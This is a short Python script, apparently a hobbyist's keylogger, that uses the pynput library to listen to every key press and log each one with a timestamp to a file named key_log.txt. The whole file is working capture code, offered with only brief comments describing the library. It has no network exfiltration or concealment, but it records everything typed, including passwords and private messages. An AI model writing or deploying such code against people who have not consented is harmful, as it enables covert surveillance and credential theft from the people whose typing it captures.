# A library I found that control and monitors input devices (mouse/keyboard input and monitoring)
from pynput.keyboard import Key, Listener
import logging

# Creates a file to save data
log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
